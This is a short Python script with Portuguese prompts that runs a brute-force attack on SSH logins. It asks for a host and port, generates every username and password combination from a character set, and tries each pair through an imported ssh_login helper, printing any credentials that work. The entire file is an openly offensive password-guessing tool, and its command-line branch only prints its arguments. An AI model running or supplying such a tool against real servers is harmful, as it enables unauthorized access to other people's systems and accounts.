import sys
from functions import generate_combinations, ssh_login, manual

if len(sys.argv) > 1:

    # Se o usuário especificar -h ou --help, mostre o manual
    if len(sys.argv) == 2 and sys.argv[1] in ['-h', '--help']:
        print(manual())
    else:
        print(sys.argv)
        print(type(sys.argv))
else:
    # Cores para o terminal
    colors = {
        'purple': '\033[95m',
        'cyan': '\033[96m',
        'darkcyan': '\033[36m',
        'blue': '\033[94m',
        'red': '\033[91m',
        'green': '\033[92m',
        'yellow': '\033[93m',
        'bold': '\033[1m',
        'underline': '\033[4m',
        'end': '\033[0m'
    }

    if __name__ == "__main__":
        host = input("HOST: ")
        port = input("PORTA: ")
        max_length = int(input("QUANTIDADE MÁXIMA DE CARACTERES: "))
        min_length = int(input("QUANTIDADE MÍNIMA DE CARACTERES: "))
        characters = input("CARACTERES: ")

        # Se o usuário não especificar os caracteres, use os caracteres padrões
        if characters == "":
            characters = r"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%&*_+=-?.,"

        print(f"\n{colors['red']}ATACANDO...{colors['end']}")
        count = 0

        for x in generate_combinations(characters, min_length, max_length):
            username = x
            for y in generate_combinations(characters, min_length, max_length):
                password = y

                print(f"\n{colors['yellow']}TENTANDO:{colors['end']}")
                print(f"Usuário >> {username}")
                print(f"Senha >> {password}")

                if ssh_login(host, port, username, password):
                    print(f"\n{colors['green']}ENCONTRADO:{colors['end']}")
                    print(f"Usuário >> {username}")
                    print(f"Senha >> {password}")
                    count += 1
                else:
                    count += 1
        print(f"\nN° TENTATIVAS: {count}")
